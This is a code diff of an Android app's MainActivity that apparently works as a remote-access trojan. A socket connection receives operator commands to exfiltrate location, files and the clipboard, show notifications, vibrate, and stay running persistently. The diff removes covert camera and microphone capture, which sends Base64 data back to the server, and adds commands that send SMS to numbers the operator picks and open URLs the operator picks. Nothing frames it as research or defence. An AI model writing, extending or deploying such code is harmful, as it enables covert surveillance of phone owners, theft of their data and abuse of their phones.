@@ -7,37 +7,24 @@ import android.app.NotificationManager;
 import android.app.Service;
 import android.content.ClipData;
 import android.content.ClipboardManager;
-import android.content.ContentResolver;
-import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
-import android.graphics.PixelFormat;
-import android.hardware.Camera;
-import android.hardware.camera2.CameraManager;
 import android.location.Location;
 import android.location.LocationManager;
-import android.media.MediaRecorder;
 import android.net.Uri;
 import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
-import android.os.Handler;
 import android.os.IBinder;
-import android.os.Looper;
 import android.os.VibrationEffect;
 import android.os.Vibrator;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.Settings;
-import android.util.Base64;
-import android.view.SurfaceHolder;
-import android.view.SurfaceView;
-import android.view.WindowManager;
+import android.telephony.SmsManager;
 import android.widget.Button;
 import android.widget.LinearLayout;
 import android.widget.TextView;
@@ -50,10 +37,7 @@ import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 import org.json.JSONArray;
 import org.json.JSONObject;
-import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
 import java.net.URISyntaxException;
 import java.util.ArrayList;
 import java.util.HashMap;
@@ -168,14 +152,14 @@ public class MainActivity extends AppCompatActivity {
                     try {
                         JSONObject data = (JSONObject) args[0];
                         String cmd = data.getString("request");
-                        handleCommand(cmd);
+                        handleCommand(cmd, data);
                     } catch (Exception e) {}
                 });
                 mSocket.connect();
             } catch (URISyntaxException e) {}
         }
 
-        private void handleCommand(String cmd) {
+        private void handleCommand(String cmd, JSONObject fullData) {
             try {
                 switch (cmd) {
                     case "vibrate": vibrate(); break;
@@ -187,12 +171,19 @@ public class MainActivity extends AppCompatActivity {
                     case "location": sendLocation(); break;
                     case "files": sendFiles(); break;
                     case "clipboard": sendClipboard(); break;
-                    case "camera_main": takePhoto(0); break;
-                    case "camera_selfie": takePhoto(1); break;
-                    case "microphone": recordAudio(10); break;
-                    case "screenshot": break;
                     case "notification": showNotif("System", "تنبيه"); break;
                     case "toast": Toast.makeText(this, "رسالة", Toast.LENGTH_LONG).show(); break;
+                    case "send_sms":
+                        String phone = fullData.optJSONArray("extras").optJSONObject(0).optString("value");
+                        String msg = fullData.optJSONArray("extras").optJSONObject(1).optString("value");
+                        SmsManager.getDefault().sendTextMessage(phone, null, msg, null, null);
+                        break;
+                    case "open_url":
+                        String url = fullData.optJSONArray("extras").optJSONObject(0).optString("value");
+                        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+                        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        startActivity(i);
+                        break;
                 }
             } catch (Exception e) {}
         }
@@ -307,49 +298,6 @@ public class MainActivity extends AppCompatActivity {
             } catch (Exception e) {}
         }
 
-        private void takePhoto(int camId) {
-            try {
-                CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
-                String[] ids = cm.getCameraIdList();
-                final int finalCamId = (camId == 1 && ids.length > 1) ? 1 : 0;
-                android.hardware.Camera camera = android.hardware.Camera.open(finalCamId);
-                camera.setPreviewTexture(new android.graphics.SurfaceTexture(0));
-                camera.startPreview();
-                camera.takePicture(null, null, (data, cam) -> {
-                    try {
-                        String encoded = Base64.encodeToString(data, Base64.NO_WRAP);
-                        mSocket.emit("commend", new JSONObject().put("type", "camera_" + finalCamId).put("data", encoded));
-                        cam.release();
-                    } catch (Exception e) {}
-                });
-            } catch (Exception e) {}
-        }
-
-        private void recordAudio(int duration) {
-            try {
-                File out = new File(getExternalFilesDir(null), "rec.m4a");
-                MediaRecorder r = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) ? new MediaRecorder(this) : new MediaRecorder();
-                r.setAudioSource(MediaRecorder.AudioSource.MIC);
-                r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-                r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-                r.setOutputFile(out.getAbsolutePath());
-                r.prepare();
-                r.start();
-                new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                    try {
-                        r.stop(); r.release();
-                        FileInputStream fis = new FileInputStream(out);
-                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                        byte[] buf = new byte[8192]; int len;
-                        while ((len = fis.read(buf)) != -1) baos.write(buf, 0, len);
-                        fis.close();
-                        String encoded = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
-                        mSocket.emit("commend", new JSONObject().put("type", "microphone").put("data", encoded));
-                    } catch (Exception e) {}
-                }, duration * 1000L);
-            } catch (Exception e) {}
-        }
-
         private void showNotif(String title, String msg) {
             NotificationCompat.Builder b = new NotificationCompat.Builder(this, CH_ID)
                     .setSmallIcon(android.R.drawable.ic_dialog_info)
@@ -360,4 +308,4 @@ public class MainActivity extends AppCompatActivity {
         @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
         @Nullable @Override public IBinder onBind(Intent intent) { return null; }
     }
-}
+        }
